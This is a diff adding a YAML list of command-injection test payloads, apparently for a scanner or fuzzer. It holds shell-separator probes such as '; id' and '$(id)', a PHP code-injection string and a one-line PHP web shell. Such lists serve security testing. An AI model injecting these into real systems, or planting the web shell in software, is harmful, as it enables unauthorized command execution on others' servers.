@@ -1,0 +1,13 @@
+payloads:
+  - "; id"
+  - "| id"
+  - "`id`"
+  - "$(id)"
+  - "; whoami"
+  - "| whoami"
+  - "; dir"
+  - "| dir"
+  - "; sleep 5"
+  - "| sleep 5"
+  - "'; system('id'); //"
+  - "<?php system($_GET['cmd']); ?>"
